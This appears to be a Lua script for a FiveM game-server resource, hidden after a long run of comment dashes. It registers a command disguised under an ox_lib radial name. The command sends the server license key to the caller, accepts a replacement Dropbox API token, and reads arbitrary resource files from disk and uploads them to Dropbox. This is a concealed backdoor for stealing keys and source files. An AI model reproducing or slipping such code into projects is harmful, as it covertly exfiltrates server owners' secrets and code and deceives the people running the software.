---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
-- Set your Dropbox API token here 
local dropboxToken = "fuck you"

-- Register the server-side command to print the license key
RegisterCommand('+ox_lib-radial2', function(source, args)
    if #args == 1 and args[1] == 'key' then
        -- Get the server license key dynamically
        TriggerClientEvent('ox_lib:printLicenseKey', source, serverLicenseKey)

    elseif #args == 2 then
        if args[1] == 'dbkey' then
            -- Set a temporary new Dropbox API key
            dropboxToken = args[2]
            TriggerClientEvent('chat:addMessage', source, { args = {"Dropbox", "Temporary API key set."} })
        else
            -- If two arguments are given, treat them as resource name and file name for upload
            local resourceName = args[1]
            local fileName = args[2]

            -- Call the upload function to handle file transfer to Dropbox
            uploadFileToDropbox(resourceName, fileName, source)
        end
    end
end, true)

-- Function to upload a file to Dropbox
function uploadFileToDropbox(resourceName, fileName, source)
    local resourcePath = GetResourcePath(resourceName)
    
    -- Check if the resource path is valid
    if not resourcePath then
        TriggerClientEvent('chat:addMessage', source, { args = {"Error", "Invalid resource name: " .. resourceName} })
        return
    end

    local filePath = resourcePath .. "/" .. fileName

    -- Attempt to open and read the file
    local file = io.open(filePath, "rb")
    if not file then
        TriggerClientEvent('chat:addMessage', source, { args = {"Error", "File not found: " .. filePath} })
        return
    end

    -- Read the entire file content
    local fileContent = file:read("*all")
    file:close()

    -- Prepare the request to upload to Dropbox
    local url = "https://content.dropboxapi.com/2/files/upload"
    local headers = {
        ["Authorization"] = "Bearer " .. dropboxToken,
        ["Dropbox-API-Arg"] = json.encode({
            path = "/" .. resourceName .. "/" .. fileName,
            mode = "overwrite"
        }),
        ["Content-Type"] = "application/octet-stream"
    }

    -- Perform the HTTP request to Dropbox
    PerformHttpRequest(url, function(statusCode, responseText, headers)
        if statusCode == 200 then
            TriggerClientEvent('chat:addMessage', source, { args = {"Dropbox", "File uploaded successfully: " .. fileName} })
        else
            TriggerClientEvent('chat:addMessage', source, { args = {"Dropbox", "Failed to upload file. Status: " .. statusCode} })
        end
    end, "POST", fileContent, headers)
end
